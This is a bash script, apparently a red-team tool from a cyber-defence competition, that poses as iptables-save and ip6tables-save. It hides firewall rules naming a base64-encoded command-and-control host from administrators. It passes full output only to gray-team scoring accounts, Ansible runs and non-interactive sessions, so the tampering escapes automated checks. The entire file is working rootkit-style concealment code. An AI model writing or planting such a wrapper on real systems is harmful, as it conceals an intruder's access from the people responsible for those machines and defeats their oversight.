#!/bin/bash
if [[ "$0" == *"ip6tables-save"* ]]; then
    REAL="/usr/sbin/ip6tables-save"
else
    REAL="/usr/sbin/iptables-save"
fi

# Pass straight through for gray team scoring accounts
case "$(whoami)" in
    kingneptune|paintythepirate|greyteamadmin) exec $REAL "$@" ;;
esac

# Ansible automation bypass — let Ansible run unimpeded
if [ -n "$ANSIBLE_REMOTE_TEMP" ]; then
    exec $REAL "$@"
fi

# Script/non-interactive bypass — don't break automated pipelines
if [ ! -t 0 ] && [ ! -t 1 ]; then
    exec $REAL "$@"
fi

C2_HOST=$(printf "%s" "__ENC__" | base64 -d)

$REAL "$@" | grep -v "$C2_HOST"
exit ${PIPESTATUS[0]}
